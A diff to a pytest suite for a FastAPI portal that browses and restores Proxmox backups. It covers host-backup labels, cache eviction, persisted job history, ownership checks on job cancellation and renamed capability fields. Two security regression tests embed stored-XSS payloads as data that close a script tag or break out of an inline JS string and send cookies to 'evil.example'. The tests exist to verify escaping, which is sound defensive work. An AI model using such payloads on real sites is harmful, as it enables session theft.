@@ -7,6 +7,7 @@ unauthenticated path.
 """
 
 import asyncio
+import dataclasses
 import io
 import json
 import time
@@ -18,7 +19,7 @@ import pytest
 main = pytest.importorskip("backend.main", reason="backend.main needs FastAPI")
 from fastapi.testclient import TestClient
 
-from backend import auth, pve_client
+from backend import auth, dir_cache, job_history, pve_client
 
 ARCHIVES = [
     {"volid": "pbs:backup/vm/133/2026-08-30T02:03:57Z", "ctime": 200, "size": 10, "verification": {"state": "ok"}},
@@ -55,6 +56,35 @@ def test_index_lists_groups_and_defaults_to_first(client):
     assert "webserver" in body
 
 
+def test_index_groups_a_host_backup_with_no_guest_name_resolution(session_data, monkeypatch):
+    # Issue #155: a host backup's "vmid" is a hostname, not a numeric id -
+    # list_guest_names (keyed by /cluster/resources, vm/ct only) never has
+    # an entry for it, so the label falls back to "HOST <hostname>".
+    archives = [
+        {"volid": "pbs-host:backup/host/pve01/2026-05-14T12:56:57Z", "ctime": 50, "size": 1, "verification": {}},
+    ]
+
+    async def fake_archives(session):
+        return pve_client.BackupListing(archives=archives)
+
+    async def fake_names(session):
+        return {}
+
+    monkeypatch.setattr(pve_client, "list_backup_archives", fake_archives)
+    monkeypatch.setattr(pve_client, "list_guest_names", fake_names)
+    main.app.dependency_overrides[auth.get_session] = lambda: session_data
+    main.app.dependency_overrides[auth.get_session_keepalive] = lambda: session_data
+    try:
+        with TestClient(main.app) as c:
+            resp = c.get("/", params={"task": "host:pve01"})
+    finally:
+        main.app.dependency_overrides.clear()
+    assert resp.status_code == 200
+    body = resp.text
+    assert "HOST pve01" in body
+    assert "2026-05-14T12:56:57Z" in body
+
+
 def test_index_respects_task_query(client):
     resp = client.get("/", params={"task": "vm:133"})
     assert resp.status_code == 200
@@ -71,6 +101,50 @@ def test_index_renders_version_and_repo_link_in_about_box(client, project_root):
     body = resp.text
     assert f"v{(project_root / 'VERSION').read_text().strip()}" in body
     assert REPO_URL in body
+
+
+def test_index_escapes_guest_name_containing_script_close_tag(session_data, monkeypatch):
+    """A PVE user needs only VM.Config.Options (far below file-restore/PBS
+    access) to rename a guest. json.dumps() doesn't escape "<", so a name
+    containing a literal "</script>" would close the `<script
+    id="groups-data">` block early and let attacker-supplied markup run in
+    every other portal user's session (stored XSS) unless "<" is escaped
+    before the JSON is embedded with `|safe`."""
+    payload = "</script><script>fetch('https://evil.example/steal')</script>"
+
+    async def fake_archives(session):
+        return pve_client.BackupListing(archives=list(ARCHIVES))
+
+    async def fake_names(session):
+        return {"133": payload}
+
+    monkeypatch.setattr(pve_client, "list_backup_archives", fake_archives)
+    monkeypatch.setattr(pve_client, "list_guest_names", fake_names)
+    main.app.dependency_overrides[auth.get_session] = lambda: session_data
+    try:
+        with TestClient(main.app) as c:
+            resp = c.get("/", params={"task": "vm:133"})
+    finally:
+        main.app.dependency_overrides.clear()
+    assert resp.status_code == 200
+    assert "</script><script>fetch" not in resp.text
+    assert "\\u003c/script>\\u003cscript>fetch" in resp.text
+
+
+def test_index_reads_task_and_identity_from_dataset_not_inline_js(client):
+    """taskPicker(...) and userMenu(...) used to splice guest_type/guest_vmid
+    and the current PVE username directly into a single-quoted JS string
+    inside x-data (same escaping-context bug as tree_nodes.html's
+    trackTreeToggle - Jinja's HTML-attribute escaping doesn't protect an
+    attribute the browser HTML-decodes before Alpine evaluates it as JS).
+    Both must now read the value back out of the element's own dataset."""
+    resp = client.get("/")
+    assert resp.status_code == 200
+    body = resp.text
+    assert "taskPicker(JSON.parse(document.getElementById('groups-data').textContent), $el.dataset.task)" in body
+    assert "userMenu($el.dataset.identity)" in body
+    assert "taskPicker(JSON.parse(document.getElementById('groups-data').textContent), 'ct:104')" not in body
+    assert "userMenu('alice@pam')" not in body
 
 
 def test_index_shows_a_banner_and_still_renders_when_a_storage_is_inaccessible(session_data, monkeypatch):
@@ -93,6 +167,51 @@ def test_index_shows_a_banner_and_still_renders_when_a_storage_is_inaccessible(s
     assert resp.status_code == 200
     assert "pbs-tier1-external" in resp.text
     assert "could not be read" in resp.text
+
+
+def test_index_evicts_dir_cache_entries_for_volumes_no_longer_listed(client, session_data):
+    """Issue #109 follow-up: a snapshot pruned by PBS retention, or a
+    user's revoked access to one, must not leave its dir_cache rows
+    behind forever - reconciled against this same request's own live
+    archive list on every normal page load."""
+    asyncio.run(dir_cache.set(session_data.username, "pbs:backup/vm/999/2020-01-01T00:00:00Z", "/", [{"text": "x"}]))
+    asyncio.run(
+        dir_cache.set(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/", [{"text": "kept"}])
+    )
+    resp = client.get("/")
+    assert resp.status_code == 200
+    assert asyncio.run(dir_cache.get(session_data.username, "pbs:backup/vm/999/2020-01-01T00:00:00Z", "/")) is None
+    assert asyncio.run(
+        dir_cache.get(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/")
+    ) == [{"text": "kept"}]
+
+
+def test_index_skips_dir_cache_eviction_when_a_storage_errored(session_data, monkeypatch):
+    """A transient PVE hiccup on one storage must never look like
+    "nothing exists anymore" and wipe good cache entries from the
+    storages that did answer."""
+    asyncio.run(dir_cache.set(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/", [{"text": "x"}]))
+
+    async def fake_archives(session):
+        return pve_client.BackupListing(
+            archives=[], errors=[pve_client.StorageError("pbs-tier1-external", "permission denied")]
+        )
+
+    async def fake_names(session):
+        return {}
+
+    monkeypatch.setattr(pve_client, "list_backup_archives", fake_archives)
+    monkeypatch.setattr(pve_client, "list_guest_names", fake_names)
+    main.app.dependency_overrides[auth.get_session] = lambda: session_data
+    try:
+        with TestClient(main.app) as c:
+            resp = c.get("/")
+    finally:
+        main.app.dependency_overrides.clear()
+    assert resp.status_code == 200
+    assert asyncio.run(
+        dir_cache.get(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/")
+    ) == [{"text": "x"}]
 
 
 def test_index_requires_auth():
@@ -350,7 +469,7 @@ def test_browse_annotates_windows_drive_letter_on_partition_folder(client, monke
     monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True))
 
     async def fake_disk_number(session, vmid, node, volume, disk_label):
         assert disk_label == "drive-efidisk0.img.fidx"
@@ -384,7 +503,7 @@ def test_tree_annotates_windows_drive_letter_on_partition_folder(client, monkeyp
     monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True))
 
     async def fake_disk_number(session, vmid, node, volume, disk_label):
         return 0
@@ -646,9 +765,50 @@ def test_tree_sorts_subdirectories_alphabetically(client, monkeypatch):
     )
 
 
+def test_tree_filepath_is_not_interpolated_into_inline_js(client, monkeypatch):
+    """A guest filesystem entry's name/filepath is attacker-controlled by
+    anyone with plain write access inside the guest - far below the
+    portal/PBS privilege of whoever later browses the backup. Filepaths
+    must never be spliced into an inline JS string literal (Jinja's
+    HTML-attribute escaping doesn't protect that context: the browser
+    HTML-decodes the attribute before the JS parser sees it), only into
+    a `data-*` attribute that JS reads back via `.dataset`."""
+    payload = "x'); fetch('https://evil.example/steal?c='+document.cookie); //"
+
+    async def fake_list_path(session, volume, filepath="/"):
+        return [{"text": "dir", "leaf": False, "filepath": payload}]
+
+    monkeypatch.setattr(pve_client, "list_path", fake_list_path)
+    resp = client.get("/api/tree", params={"volume": "vol", "filepath": "/", "crumbs": "[]"})
+    assert resp.status_code == 200
+    body = resp.text
+    # The @click handler must read the filepath back out of the element's
+    # dataset rather than have it spliced into the handler's JS source as a
+    # string literal - Jinja's HTML-entity escaping (which still applies to
+    # the data-filepath="..." attribute below) does not protect an inline
+    # event-handler attribute, since the browser HTML-decodes it before the
+    # JS parser ever sees it.
+    assert "trackTreeToggle($el.dataset.filepath, open)" in body
+    assert "trackTreeToggle('" not in body
+    assert 'data-filepath="' in body
+
+
 def test_restore_capabilities_rejects_unknown_guest_type(client):
     resp = client.get("/api/restore-capabilities", params={"type": "bogus", "vmid": "133"})
     assert resp.status_code == 400
+
+
+def test_restore_capabilities_host_backup_is_a_clean_unavailable_not_a_400(client):
+    # Issue #155: a host backup has no guest to push into - this must be
+    # a normal 200/unavailable, not a 400, or the frontend's restore
+    # button gets stuck on "Checking restore availability..." forever
+    # (it treats any non-2xx as "never loaded", not "loaded: false").
+    resp = client.get("/api/restore-capabilities", params={"type": "host", "vmid": "myhostname"})
+    assert resp.status_code == 200
+    body = resp.json()
+    assert body["file_write"]["available"] is False
+    assert body["guest_exec"]["available"] is False
+    assert "host backup" in body["guest_exec"]["reason"]
 
 
 def test_restore_capabilities_returns_capability_json(client, monkeypatch):
@@ -661,8 +821,8 @@ def test_restore_capabilities_returns_capability_json(client, monkeypatch):
             agent_running=True,
             pve_version_ok=True,
             guest_os_family="linux",
-            design_a=guest_agent.PathAvailability(True),
-            design_b=guest_agent.PathAvailability(False, "missing VM.GuestAgent.Unrestricted privilege"),
+            file_write=guest_agent.PathAvailability(True),
+            guest_exec=guest_agent.PathAvailability(False, "missing VM.GuestAgent.Unrestricted privilege"),
             verify_supported=False,
         )
 
@@ -671,9 +831,9 @@ def test_restore_capabilities_returns_capability_json(client, monkeypatch):
     assert resp.status_code == 200
     body = resp.json()
     assert body["agent_running"] is True
-    assert body["design_a"] == {"available": True, "reason": None}
-    assert body["design_b"]["available"] is False
-    assert "Unrestricted" in body["design_b"]["reason"]
+    assert body["file_write"] == {"available": True, "reason": None}
+    assert body["guest_exec"]["available"] is False
+    assert "Unrestricted" in body["guest_exec"]["reason"]
 
 
 def test_restore_capabilities_degrades_on_pve_error_instead_of_500(client, monkeypatch):
@@ -690,9 +850,9 @@ def test_restore_capabilities_degrades_on_pve_error_instead_of_500(client, monke
     resp = client.get("/api/restore-capabilities", params={"type": "vm", "vmid": "133"})
     assert resp.status_code == 200
     body = resp.json()
-    assert body["design_a"]["available"] is False
-    assert body["design_b"]["available"] is False
-    assert "VM.Audit" in body["design_a"]["reason"]  # 403 -> a permissions hint
+    assert body["file_write"]["available"] is False
+    assert body["guest_exec"]["available"] is False
+    assert "VM.Audit" in body["file_write"]["reason"]  # 403 -> a permissions hint
 
 
 def test_restore_capabilities_degrades_on_connect_error(client, monkeypatch):
@@ -704,7 +864,7 @@ def test_restore_capabilities_degrades_on_connect_error(client, monkeypatch):
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", unreachable)
     resp = client.get("/api/restore-capabilities", params={"type": "vm", "vmid": "133"})
     assert resp.status_code == 200
-    assert "reach PVE" in resp.json()["design_a"]["reason"]
+    assert "reach PVE" in resp.json()["file_write"]["reason"]
 
 
 def _available_caps(**overrides):
@@ -714,8 +874,8 @@ def _available_caps(**overrides):
         agent_running=True,
         pve_version_ok=True,
         guest_os_family="windows",
-        design_a=guest_agent.PathAvailability(True),
-        design_b=guest_agent.PathAvailability(False, "missing VM.GuestAgent.Unrestricted privilege"),
+        file_write=guest_agent.PathAvailability(True),
+        guest_exec=guest_agent.PathAvailability(False, "missing VM.GuestAgent.Unrestricted privilege"),
         verify_supported=False,
     )
     defaults.update(overrides)
@@ -775,7 +935,7 @@ def test_restore_blocked_when_capability_unavailable(client, monkeypatch):
     from backend import guest_agent
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_a=guest_agent.PathAvailability(False, "missing VM.GuestAgent.FileWrite"))
+        return _available_caps(file_write=guest_agent.PathAvailability(False, "missing VM.GuestAgent.FileWrite"))
 
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
     resp = client.post("/api/restore", data=_restore_form())
@@ -801,7 +961,7 @@ def test_restore_bundle_submits_a_queued_job(client, monkeypatch):
     from backend import guest_agent, restore_jobs, restore_runner
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True))
 
     async def never_runs(job, jobs):
         pass
@@ -834,7 +994,7 @@ def test_restore_bundle_passes_ownership_through_for_a_linux_guest(client, monke
     from backend import guest_agent, restore_jobs, restore_runner
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(guest_os_family="linux", design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_os_family="linux", guest_exec=guest_agent.PathAvailability(True))
 
     async def never_runs(job, jobs):
         pass
@@ -858,7 +1018,7 @@ def test_restore_bundle_ownership_forced_false_for_a_windows_guest(client, monke
 
     async def fake_caps(session, guest_type, vmid):
         # guest_os_family defaults to "windows" in _available_caps()
-        return _available_caps(design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True))
 
     async def never_runs(job, jobs):
         pass
@@ -886,7 +1046,7 @@ def test_restore_bundle_tolerates_extra_fields_in_item_json(client, monkeypatch)
     from backend import guest_agent, restore_jobs, restore_runner
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True))
 
     async def never_runs(job, jobs):
         pass
@@ -905,15 +1065,15 @@ def test_restore_bundle_tolerates_extra_fields_in_item_json(client, monkeypatch)
     assert job.items[0].leaf is False
 
 
-def test_restore_bundle_checks_design_b_not_design_a(client, monkeypatch):
-    # A bundle restore always needs guest-exec - design_a availability
+def test_restore_bundle_checks_guest_exec_not_file_write(client, monkeypatch):
+    # A bundle restore always needs guest-exec - file_write availability
     # (the single-call fast path) is irrelevant to it.
     from backend import guest_agent
 
     async def fake_caps(session, guest_type, vmid):
         return _available_caps(
-            design_a=guest_agent.PathAvailability(False, "missing VM.GuestAgent.FileWrite"),
-            design_b=guest_agent.PathAvailability(True),
+            file_write=guest_agent.PathAvailability(False, "missing VM.GuestAgent.FileWrite"),
+            guest_exec=guest_agent.PathAvailability(True),
         )
 
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
@@ -927,15 +1087,15 @@ def test_restore_bundle_checks_design_b_not_design_a(client, monkeypatch):
 
     monkeypatch.setattr(restore_runner, "run_restore", never_runs)
     resp = client.post("/api/restore", data=form)
-    assert resp.status_code == 200  # design_a being unavailable doesn't block a bundle restore
+    assert resp.status_code == 200  # file_write being unavailable doesn't block a bundle restore
     assert restore_jobs.manager.get(resp.json()["id"]) is not None
 
 
-def test_restore_bundle_blocked_without_design_b(client, monkeypatch):
+def test_restore_bundle_blocked_without_guest_exec(client, monkeypatch):
     from backend import guest_agent
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(False, "missing VM.GuestAgent.Unrestricted"))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(False, "missing VM.GuestAgent.Unrestricted"))
 
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
     form = _restore_form(filepath=None, name=None)
@@ -949,7 +1109,7 @@ def test_restore_bundle_rejects_invalid_item_json(client, monkeypatch):
     from backend import guest_agent
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True))
 
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
     form = _restore_form(filepath=None, name=None)
@@ -975,12 +1135,12 @@ def test_restore_uses_posix_separator_for_non_windows_guest(client, monkeypatch)
     assert resp.json()["destination"] == "/etc/hosts"
 
 
-def test_restore_blocked_when_metadata_requested_without_design_b(client, monkeypatch):
+def test_restore_blocked_when_metadata_requested_without_guest_exec(client, monkeypatch):
     from backend import guest_agent
 
     async def fake_caps(session, guest_type, vmid):
-        # design_a available, design_b not - only FileWrite, no Unrestricted
-        return _available_caps(design_a=guest_agent.PathAvailability(True))
+        # file_write available, guest_exec not - only FileWrite, no Unrestricted
+        return _available_caps(file_write=guest_agent.PathAvailability(True))
 
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
     resp = client.post("/api/restore", data=_restore_form(restore_metadata="true"))
@@ -988,11 +1148,11 @@ def test_restore_blocked_when_metadata_requested_without_design_b(client, monkey
     assert "Unrestricted" in resp.json()["detail"]
 
 
-def test_restore_blocked_when_verify_requested_without_design_b(client, monkeypatch):
+def test_restore_blocked_when_verify_requested_without_guest_exec(client, monkeypatch):
     from backend import guest_agent
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_a=guest_agent.PathAvailability(True))
+        return _available_caps(file_write=guest_agent.PathAvailability(True))
 
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
     resp = client.post("/api/restore", data=_restore_form(verify="true"))
@@ -1004,7 +1164,7 @@ def test_restore_passes_metadata_verify_and_mtime_through_to_the_job(client, mon
 
     async def fake_caps(session, guest_type, vmid):
         return _available_caps(
-            design_a=guest_agent.PathAvailability(True), design_b=guest_agent.PathAvailability(True)
+            file_write=guest_agent.PathAvailability(True), guest_exec=guest_agent.PathAvailability(True)
         )
 
     async def never_runs(job, jobs):
@@ -1023,11 +1183,11 @@ def test_restore_passes_metadata_verify_and_mtime_through_to_the_job(client, mon
     assert job.source_mtime == 1700000000
 
 
-def test_restore_blocked_when_ownership_requested_without_design_b(client, monkeypatch):
+def test_restore_blocked_when_ownership_requested_without_guest_exec(client, monkeypatch):
     from backend import guest_agent
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_a=guest_agent.PathAvailability(True))
+        return _available_caps(file_write=guest_agent.PathAvailability(True))
 
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
     resp = client.post("/api/restore", data=_restore_form(restore_ownership="true"))
@@ -1040,8 +1200,8 @@ def test_restore_passes_ownership_through_to_the_job_for_a_linux_guest(client, m
     async def fake_caps(session, guest_type, vmid):
         return _available_caps(
             guest_os_family="linux",
-            design_a=guest_agent.PathAvailability(True),
-            design_b=guest_agent.PathAvailability(True),
+            file_write=guest_agent.PathAvailability(True),
+            guest_exec=guest_agent.PathAvailability(True),
         )
 
     async def never_runs(job, jobs):
@@ -1066,7 +1226,7 @@ def test_restore_ownership_forced_false_for_a_windows_guest_regardless_of_reques
     async def fake_caps(session, guest_type, vmid):
         # guest_os_family defaults to "windows" in _available_caps()
         return _available_caps(
-            design_a=guest_agent.PathAvailability(True), design_b=guest_agent.PathAvailability(True)
+            file_write=guest_agent.PathAvailability(True), guest_exec=guest_agent.PathAvailability(True)
         )
 
     async def never_runs(job, jobs):
@@ -1102,14 +1262,168 @@ def test_restore_jobs_list_returns_submitted_job(client, monkeypatch):
 
     resp = client.get("/api/restore-jobs")
     assert resp.status_code == 200
-    jobs = resp.json()
+    body = resp.json()
+    jobs = body["jobs"]
     assert any(j["id"] == submitted["id"] for j in jobs)
+    assert any(j["requested_by"] == submitted["requested_by"] for j in jobs)
 
 
 def test_restore_jobs_list_empty_when_none_submitted(client):
     resp = client.get("/api/restore-jobs")
     assert resp.status_code == 200
-    assert resp.json() == []
+    body = resp.json()
+    assert body["jobs"] == []
+    # Default RESTRICT_JOBS_TO_OWN is off - unrestricted/unchanged behavior.
+    assert body["scope"] == "all"
+    assert body["can_see_all"] is True
+
+
+def _persist_historical_job(session_data, **overrides):
+    """Simulates a job left behind by a previous process - written
+    straight to job_history via a throwaway manager, never wired into
+    main.app's own in-memory restore_jobs.manager."""
+    from backend.restore_jobs import RestoreJobManager
+
+    throwaway = RestoreJobManager()
+    defaults = dict(
+        session=session_data,
+        guest_type="vm",
+        vmid="133",
+        guest_label="web (133)",
+        task_name="Restore 2026-08-30 14:48 -> /etc",
+        snapshot_time="2026-08-30T14:48:06Z",
+        source_volume="pbs:backup/vm/133/2026-08-30T14:48:06Z",
+        source_filepath="L2V0Yy9ob3N0cw==",
+        source="/etc/hosts",
+        destination="/etc",
+    )
+    defaults.update(overrides)
+    return throwaway.create(**defaults)
+
+
+def test_restore_jobs_list_includes_persisted_jobs_from_a_previous_process(client, session_data):
+    import time
+
+    from backend.restore_jobs import RestoreStatus
+
+    job = _persist_historical_job(session_data)
+    job.status = RestoreStatus.DONE
+    job.finished_at = time.time()
+    job_history.persist_sync(job)
+
+    resp = client.get("/api/restore-jobs")
+    body = resp.json()
+    entry = next((j for j in body["jobs"] if j["id"] == job.id), None)
+    assert entry is not None
+    assert entry["status"] == "done"
+    assert entry["can_cancel"] is False
+    assert "log" not in entry
+
+
+def test_restore_jobs_list_live_job_takes_precedence_over_its_own_persisted_row(client, monkeypatch):
+    """A job still tracked by this process's in-memory manager must not
+    also show up a second time via its own (now-stale) persisted row."""
+    from backend import guest_agent, restore_runner
+
+    async def fake_caps(session, guest_type, vmid):
+        return _available_caps()
+
+    async def never_runs(job, jobs):
+        pass
+
+    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
+    monkeypatch.setattr(restore_runner, "run_restore", never_runs)
+    submitted = client.post("/api/restore", data=_restore_form()).json()
+
+    resp = client.get("/api/restore-jobs")
+    body = resp.json()
+    matches = [j for j in body["jobs"] if j["id"] == submitted["id"]]
+    assert len(matches) == 1
+
+
+def test_restore_jobs_list_omits_persisted_jobs_past_retention(client, monkeypatch, session_data):
+    import time
+
+    from backend.restore_jobs import RestoreStatus
+
+    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, job_history_retention_days=7))
+    job = _persist_historical_job(session_data)
+    job.status = RestoreStatus.DONE
+    job.finished_at = time.time() - (8 * 86400)
+    job_history.persist_sync(job)
+
+    resp = client.get("/api/restore-jobs")
+    body = resp.json()
+    assert all(j["id"] != job.id for j in body["jobs"])
+
+
+def test_restore_jobs_detail_falls_back_to_persisted_history(client, session_data):
+    from backend.restore_jobs import RestoreStatus
+
+    job = _persist_historical_job(session_data)
+    job.status = RestoreStatus.DONE
+    job.log("ran to completion")
+    job_history.persist_sync(job)
+
+    resp = client.get(f"/api/restore-jobs/{job.id}")
+    assert resp.status_code == 200
+    body = resp.json()
+    assert any("ran to completion" in line for line in body["log"])
+
+
+def test_restore_jobs_detail_404s_when_not_live_or_persisted(client):
+    resp = client.get("/api/restore-jobs/does-not-exist-anywhere")
+    assert resp.status_code == 404
+
+
+def test_restore_jobs_list_defaults_to_mine_when_restricted(client, monkeypatch):
+    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, restrict_jobs_to_own=True))
+    resp = client.get("/api/restore-jobs")
+    assert resp.status_code == 200
+    body = resp.json()
+    assert body["scope"] == "mine"
+    assert body["can_see_all"] is False
+
+
+def test_restore_jobs_list_restricted_non_admin_cannot_request_all(client, monkeypatch):
+    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, restrict_jobs_to_own=True))
+    resp = client.get("/api/restore-jobs", params={"scope": "all"})
+    assert resp.status_code == 200
+    body = resp.json()
+    # Clamped back to "mine" - a restricted, non-admin session can't opt out server-side.
+    assert body["scope"] == "mine"
+    assert body["can_see_all"] is False
+
+
+def test_restore_jobs_list_restricted_admin_can_request_all(client, monkeypatch, session_data):
+    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, restrict_jobs_to_own=True))
+    session_data.cap = {"dc": {"Sys.Audit": 1}}
+    resp = client.get("/api/restore-jobs", params={"scope": "all"})
+    assert resp.status_code == 200
+    body = resp.json()
+    assert body["scope"] == "all"
+    assert body["can_see_all"] is True
+
+
+def test_restore_jobs_list_restricted_filters_to_own_jobs(client, monkeypatch):
+    from backend import guest_agent, restore_runner
+
+    async def fake_caps(session, guest_type, vmid):
+        return _available_caps()
+
+    async def never_runs(job, jobs):
+        pass
+
+    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
+    monkeypatch.setattr(restore_runner, "run_restore", never_runs)
+    submitted = client.post("/api/restore", data=_restore_form()).json()
+
+    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, restrict_jobs_to_own=True))
+    resp = client.get("/api/restore-jobs")
+    assert resp.status_code == 200
+    body = resp.json()
+    assert all(j["requested_by"] == submitted["requested_by"] for j in body["jobs"])
+    assert any(j["id"] == submitted["id"] for j in body["jobs"])
 
 
 def test_restore_jobs_list_requires_auth():
@@ -1180,10 +1494,102 @@ def test_restore_jobs_cancel_marks_flag_and_returns_job(client, monkeypatch):
     assert resp.json()["id"] == submitted["id"]
 
 
+def test_restore_jobs_cancel_forbidden_for_non_owner_non_admin(client, monkeypatch, session_data):
+    """Issue #123: cancel has its own ownership check, independent of
+    RESTRICT_JOBS_TO_OWN (#122) - a job submitted by one user can't be
+    cancelled by another who isn't a job admin either."""
+    from backend import guest_agent, restore_jobs, restore_runner
+
+    async def fake_caps(session, guest_type, vmid):
+        return _available_caps()
+
+    async def hangs(job, jobs):
+        await asyncio.sleep(3600)
+
+    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
+    monkeypatch.setattr(restore_runner, "run_restore", hangs)
+    submitted = client.post("/api/restore", data=_restore_form()).json()
+
+    other = dataclasses.replace(session_data, username="mallory@pam", cap={})
+    main.app.dependency_overrides[auth.get_session] = lambda: other
+    try:
+        resp = client.post(f"/api/restore-jobs/{submitted['id']}/cancel")
+    finally:
+        main.app.dependency_overrides[auth.get_session] = lambda: session_data
+    assert resp.status_code == 403
+
+    job = restore_jobs.manager.get(submitted["id"])
+    assert job.status != restore_jobs.RestoreStatus.CANCELLED
+
+
+def test_restore_jobs_cancel_allowed_for_job_admin(client, monkeypatch, session_data):
+    """A non-owner who holds the configured bypass privilege (cap["dc"])
+    can still cancel someone else's job."""
+    from backend import guest_agent, restore_runner
+
+    async def fake_caps(session, guest_type, vmid):
+        return _available_caps()
+
+    async def hangs(job, jobs):
+        await asyncio.sleep(3600)
+
+    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
+    monkeypatch.setattr(restore_runner, "run_restore", hangs)
+    submitted = client.post("/api/restore", data=_restore_form()).json()
+
+    admin = dataclasses.replace(session_data, username="admin@pam", cap={"dc": {"Sys.Audit": 1}})
+    main.app.dependency_overrides[auth.get_session] = lambda: admin
+    try:
+        resp = client.post(f"/api/restore-jobs/{submitted['id']}/cancel")
+    finally:
+        main.app.dependency_overrides[auth.get_session] = lambda: session_data
+    assert resp.status_code == 200
+
+
+def test_restore_jobs_list_can_cancel_reflects_ownership(client, monkeypatch, session_data):
+    from backend import guest_agent, restore_runner
+
+    async def fake_caps(session, guest_type, vmid):
+        return _available_caps()
+
+    async def never_runs(job, jobs):
+        pass
+
+    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
+    monkeypatch.setattr(restore_runner, "run_restore", never_runs)
+    submitted = client.post("/api/restore", data=_restore_form()).json()
+
+    resp = client.get("/api/restore-jobs")
+    jobs = {j["id"]: j for j in resp.json()["jobs"]}
+    assert jobs[submitted["id"]]["can_cancel"] is True
+
+    other = dataclasses.replace(session_data, username="mallory@pam", cap={})
+    main.app.dependency_overrides[auth.get_session_keepalive] = lambda: other
+    try:
+        resp = client.get("/api/restore-jobs")
+    finally:
+        main.app.dependency_overrides[auth.get_session_keepalive] = lambda: session_data
+    jobs = {j["id"]: j for j in resp.json()["jobs"]}
+    assert jobs[submitted["id"]]["can_cancel"] is False
+
+
 def test_restore_jobs_cancel_requires_auth():
     with TestClient(main.app) as c:
         resp = c.post("/api/restore-jobs/x/cancel", follow_redirects=False)
     assert resp.status_code in (302, 401)
+
+
+async def test_startup_reconciles_jobs_left_active_by_a_previous_process(session_data):
+    """A new TestClient entering triggers main.py's lifespan startup
+    hook, which must reconcile a still-active row to interrupted."""
+    job = _persist_historical_job(session_data)  # left "queued" - never transitioned
+    assert job.is_active
+
+    with TestClient(main.app):
+        pass  # lifespan startup/shutdown is all this test needs to trigger
+
+    detail = await job_history.get(job.id)
+    assert detail["status"] == "interrupted"
 
 
 def test_restore_capabilities_requires_auth():
@@ -1197,12 +1603,12 @@ def test_restore_browse_rejects_unknown_guest_type(client):
     assert resp.status_code == 400
 
 
-def test_restore_browse_blocked_without_design_b(client, monkeypatch):
+def test_restore_browse_blocked_without_guest_exec(client, monkeypatch):
     from backend import guest_agent
 
     async def fake_caps(session, guest_type, vmid):
         reason = "missing VM.GuestAgent.Unrestricted privilege"
-        return _available_caps(design_b=guest_agent.PathAvailability(False, reason))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(False, reason))
 
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
     resp = client.get("/api/restore-browse", params={"type": "vm", "vmid": "133"})
@@ -1214,7 +1620,7 @@ def test_restore_browse_returns_listing(client, monkeypatch):
     from backend import guest_agent, guest_browse
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True), guest_os_family="linux")
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True), guest_os_family="linux")
 
     async def fake_list(session, guest_type, vmid, guest_os_family, path, **kwargs):
         assert guest_os_family == "linux"
@@ -1233,7 +1639,7 @@ def test_restore_browse_unsafe_path_returns_400(client, monkeypatch):
     from backend import guest_agent, guest_browse
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True))
 
     async def fake_list(session, guest_type, vmid, guest_os_family, path, **kwargs):
         raise guest_browse.UnsafePathError("nope")
@@ -1248,7 +1654,7 @@ def test_restore_browse_listing_error_returns_502(client, monkeypatch):
     from backend import guest_agent, guest_browse
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True))
 
     async def fake_list(session, guest_type, vmid, guest_os_family, path, **kwargs):
         raise guest_browse.ListingError("No such file or directory")
